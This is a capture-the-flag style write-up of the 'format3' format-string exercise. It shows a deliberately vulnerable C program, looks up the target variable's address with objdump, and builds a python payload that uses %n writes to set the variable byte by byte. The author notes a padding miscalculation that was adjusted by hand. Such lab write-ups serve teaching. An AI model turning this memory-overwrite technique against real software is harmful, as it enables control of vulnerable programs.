# format3

## Enumeration
The code:
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

Finding the location of target in memory:
```bash
objdump -d format3 | grep .bss

080496e8 l    d  .bss   00000000              .bss
080496ec l     O .bss   00000001              completed.5982
080496f0 l     O .bss   00000004              dtor_idx.5984
080496e8 g       *ABS*  00000000              __bss_start
080496e8 g     O .bss   00000004              stdin@@GLIBC_2.0
080496f4 g     O .bss   00000004              target
```

## Exploitation
Clearly I'm overwriting target. The problem is that 0x01025544 (which is 16930116)is a very big number. I can actually write specific values to each byte by doing the following:
```
0x080496f4	0x44
0x080496f5		0x55
0x080496f6			0x02
0x080496f7				0x01
==============================================
			0x01025544
```
Ok, lets see how many bytes I'm forced to write the target.
```bash
python -c 'print "AAAA" + "\xf4\x96\x04\x08" + "%x."*12 + "%n."' | ./format3

target is 0000007f :(
```
Getting 0x55 is not possible. But I can wrap the byte around as 0x155. I just need to do some basic arithmetic to determine what the buffer space should be.
```bash
python -c 'print 0x144 - 0x7f + 0x8'

205
```
Using this in the payload:
```bash
python -c 'print "AAAA" + "\xf4\x96\x04\x08" + "%x."*11 + "%246x." + "%n."' | ./format3

target is 00000155 :(
```
Next, you add padding for each memory location in order to write to them. Then its simple rinse and repeat. Below are all the python arithmetic to calculate the whitespace and below that is the final payload.
```bash
python -c 'print 0x55 - 0x44'
17

python -c 'print 0x02 - 0x55'
-83

python -c 'print 0x102 - 0x55'
173

python -c 'print 0x01 - 0x02'
-1

python -c 'print 0x101 - 0x02'
255
```
Somewhere along the way I miss calculated by a factor of 2 so all the whitespace padding are decremented by 2 in my final payload. 
```bash
python -c 'print "AAAA" + "\xf4\x96\x04\x08" + "BBBB" + "\xf5\x96\x04\x08" + "CCCC" + "\xf6\x96\x04\x08" + "DDDD" + "\xf7\x96\x04\x08" + "%x."*11 + "%205x." + "%n." + "%15x." + "%n." + "%171x." + "%n." + "%253x." + "%n."' | ./format3
```
